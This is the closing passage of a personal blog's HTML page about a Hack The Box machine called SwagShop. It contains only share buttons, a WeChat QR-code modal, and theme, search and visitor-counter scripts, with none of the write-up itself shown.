        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&title=《SwagShop - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&title=《SwagShop - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SwagShop - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrUlEQVR42u3a0WrDMAwF0P7/T2/PYzi7kqzSwclTYWni44HtXun1iq+v+Pp9/+lpp+c/v/e1ceHh4eFdHfppQM/ffSadJuLES751fDseHh7eGq86oOrnW5tEPmY8PDy8z+El20Nyyn0mPW9OeHh4eP+F14sh8qX/ebLw8PDwPo3Xi2WrjGTKJt/Fw8PDew8vryJ9zueV+h4eHh7e1YaAvGR198mTCw8PD2+DN2kdyA/Z+UJffUsUSeDh4eEt8241VE3ChedtJvkrHh4e3nt4kwapvHyVT2I1hjjeg4eHh3eVVy0p9cLWedtB9fl4eHh4e7xqE0B1e5hsP9UjOB4eHt47edWAoFoMK5zuW020f/wD8PDw8BZ4SWhbDXN7xbBndvXteHh4eBu8ajTQG/qkJau6nfy4Ew8PD2+BNy/8T1qvJkfwQjiCh4eHd5WXl5d6x+7esPJ4949NCw8PD2+N12uZqk7N3TJbtEXh4eHhLfDy5T4pifVi37y1qzoGPDw8vA1etfBfLVDlS/mk9HW04OHh4S3wJg0EeZibbAxJo1UvMsbDw8O7y5sfpnstBckmUW0dWPmtgIeHh3fg5eWu+T15WFyd0OMvBjw8PLwFXnUJngylGltUt5Mow8DDw8Mb8HqAXpibPK2H7FW78PDw8Ca8fHvIQ9vecTyfvkJ5DA8PD2+Nd3cRn5fTms0Bv8eDh4eH93be5Hd99ahdbbQqhA54eHh4l3hfxWvSUvA8odUwIhoPHh4e3gJvssZOBlSNZXshLx4eHt4eL98M8s2jB65GG+WUGg8PD+8qLw8peptH768XLjw8PLwP480Pyr0JTY74eHh4eJ/DS16ZRxv59FUP9Hh4eHjbvMnBNwkdkk2lvOhvx7h4eHh44wJYvsRXp28SalwIMvDw8PBS3jc4m1sH9LZupAAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
